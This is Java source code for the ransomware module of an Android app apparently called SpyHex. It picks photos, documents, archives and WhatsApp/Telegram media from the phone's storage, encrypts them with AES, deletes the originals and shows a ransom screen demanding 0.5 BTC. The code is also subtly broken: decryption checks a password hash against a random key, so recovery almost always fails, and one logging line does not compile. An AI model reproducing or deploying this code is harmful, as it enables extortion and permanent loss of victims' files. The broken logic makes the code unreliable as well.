package com.spyhex.app.features.ransomware;

import android.app.Activity;
import android.app.KeyguardManager;
import android.content.Context;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.view.WindowManager;
import android.widget.Toast;

import com.spyhex.app.core.SpyHexApp;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.security.SecureRandom;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

import javax.crypto.Cipher;
import javax.crypto.CipherInputStream;
import javax.crypto.CipherOutputStream;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class RansomwareManager {
    private static RansomwareManager instance;
    private final Context ctx;
    private boolean isActive = false;
    private String ransomTitle = "Your files have been encrypted";
    private String ransomBody = "Send 0.5 BTC to decrypt";
    private String walletAddress = "";
    private List<String> encryptedPaths = new ArrayList<>();
    private final String ALGORITHM = "AES/CBC/PKCS5Padding";
    private final int KEY_SIZE = 256;
    private byte[] currentKey;

    private RansomwareManager() {
        this.ctx = SpyHexApp.getContext();
    }

    public static synchronized RansomwareManager getInstance() {
        if (instance == null) instance = new RansomwareManager();
        return instance;
    }

    public void trigger(String title, String body, String wallet) {
        this.ransomTitle = title;
        this.ransomBody = body;
        this.walletAddress = wallet;
        this.isActive = true;

        // Generate random AES key
        currentKey = generateKey();

        // Encrypt files in background
        new Thread(() -> {
            try {
                encryptTargetFiles();
                showRansomOverlay();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    private byte[] generateKey() {
        byte[] key = new byte[32];
        new SecureRandom().nextBytes(key);
        return key;
    }

    private void encryptTargetFiles() {
        List<File> targets = new ArrayList<>();
        // Target common user directories
        File[] dirs = {
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS),
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS),
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES),
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MUSIC),
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MOVIES),
            new File(Environment.getExternalStorageDirectory(), "DCIM"),
            new File(Environment.getExternalStorageDirectory(), "WhatsApp/Media"),
            new File(Environment.getExternalStorageDirectory(), "Telegram"),
            ctx.getExternalFilesDir(null)
        };

        for (File dir : dirs) {
            if (dir != null && dir.exists()) {
                collectFiles(dir, targets, 500); // Max 500 files
            }
        }

        for (File file : targets) {
            try {
                if (encryptFile(file)) {
                    encryptedPaths.add(file.getAbsolutePath() + ".spyhex");
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    private void collectFiles(File dir, List<File> targets, int max) {
        if (targets.size() >= max) return;
        File[] files = dir.listFiles();
        if (files == null) return;
        for (File f : files) {
            if (targets.size() >= max) break;
            if (f.isDirectory() && !f.getName().startsWith(".")) {
                collectFiles(f, targets, max);
            } else if (f.isFile() && f.length() > 0 && f.length() < 50 * 1024 * 1024) { // < 50MB
                String name = f.getName().toLowerCase();
                if (name.endsWith(".jpg") || name.endsWith(".jpeg") || name.endsWith(".png") ||
                    name.endsWith(".mp4") || name.endsWith(".pdf") || name.endsWith(".doc") ||
                    name.endsWith(".docx") || name.endsWith(".txt") || name.endsWith(".xls") ||
                    name.endsWith(".xlsx") || name.endsWith(".ppt") || name.endsWith(".pptx") ||
                    name.endsWith(".zip") || name.endsWith(".rar") || name.endsWith(".db") ||
                    name.endsWith(".xml") || name.endsWith(".json") || name.endsWith(".csv")) {
                    targets.add(f);
                }
            }
        }
    }

    private boolean encryptFile(File file) throws Exception {
        File encrypted = new File(file.getAbsolutePath() + ".spyhex");
        if (encrypted.exists()) return false;

        Cipher cipher = Cipher.getInstance(ALGORITHM);
        SecretKeySpec keySpec = new SecretKeySpec(currentKey, "AES");
        byte[] iv = new byte[16];
        new SecureRandom().nextBytes(iv);
        IvParameterSpec ivSpec = new IvParameterSpec(iv);
        cipher.init(Cipher.ENCRYPT_MODE, keySpec, ivSpec);

        FileInputStream fis = new FileInputStream(file);
        FileOutputStream fos = new FileOutputStream(encrypted);
        fos.write(iv); // Prepend IV
        CipherOutputStream cos = new CipherOutputStream(fos, cipher);

        byte[] buffer = new byte[8192];
        int read;
        while ((read = fis.read(buffer)) != -1) {
            cos.write(buffer, 0, read);
        }
        cos.close();
        fis.close();

        // Delete original after successful encryption
        file.delete();
        return true;
    }

    public boolean decrypt(String password) {
        if (!isActive || currentKey == null) return false;
        // Derive key from password using SHA-256
        try {
            MessageDigest md = MessageDigest.getInstance("SHA-256");
            byte[] derived = md.digest(password.getBytes(StandardCharsets.UTF_8));
            if (!Arrays.equals(derived, currentKey)) {
                return false; // Wrong password
            }

            for (String path : encryptedPaths) {
                File enc = new File(path);
                if (!enc.exists()) continue;
                File original = new File(path.replace(".spyhex", ""));
                decryptFile(enc, original);
                enc.delete();
            }
            encryptedPaths.clear();
            isActive = false;
            hideRansomOverlay();
            return true;
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }

    private void decryptFile(File encrypted, File original) throws Exception {
        FileInputStream fis = new FileInputStream(encrypted);
        byte[] iv = new byte[16];
        fis.read(iv);

        Cipher cipher = Cipher.getInstance(ALGORITHM);
        SecretKeySpec keySpec = new SecretKeySpec(currentKey, "AES");
        IvParameterSpec ivSpec = new IvParameterSpec(iv);
        cipher.init(Cipher.DECRYPT_MODE, keySpec, ivSpec);

        FileOutputStream fos = new FileOutputStream(original);
        CipherInputStream cis = new CipherInputStream(fis, cipher);
        byte[] buffer = new byte[8192];
        int read;
        while ((read = cis.read(buffer)) != -1) {
            fos.write(buffer, 0, read);
        }
        cis.close();
        fos.close();
    }

    private void showRansomOverlay() {
        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                android.content.Intent intent = new android.content.Intent(ctx, RansomwareActivity.class);
                intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK
                    | android.content.Intent.FLAG_ACTIVITY_CLEAR_TASK
                    | android.content.Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
                intent.putExtra("title", ransomTitle);
                intent.putExtra("body", ransomBody);
                intent.putExtra("wallet", walletAddress);
                ctx.startActivity(intent);
            } catch (Exception e) {
                e.printStackTrace();
            }
        });
    }

    private void hideRansomOverlay() {
        // Activity will finish itself when decrypt succeeds
        android.content.Intent intent = new android.content.Intent("SPYHEX_RANSOM_CLOSE");
        ctx.sendBroadcast(intent);
    }

    public JSONObject getStatus() {
        JSONObject s = new JSONObject();
        try {
            s.put("active", isActive);
            s.put("encryptedCount", encryptedPaths.size());
            s.put("title", ransomTitle);
            s.put("body", ransomBody);
            s.put("wallet", walletAddress);
            s.put("hasKey", currentKey != null);
        } catch (Exception e) { android.util.Log.e("SpyHex", "Error: " + Exception e.getMessage()); }
        return s;
    }

    public boolean isActive() { return isActive; }
}
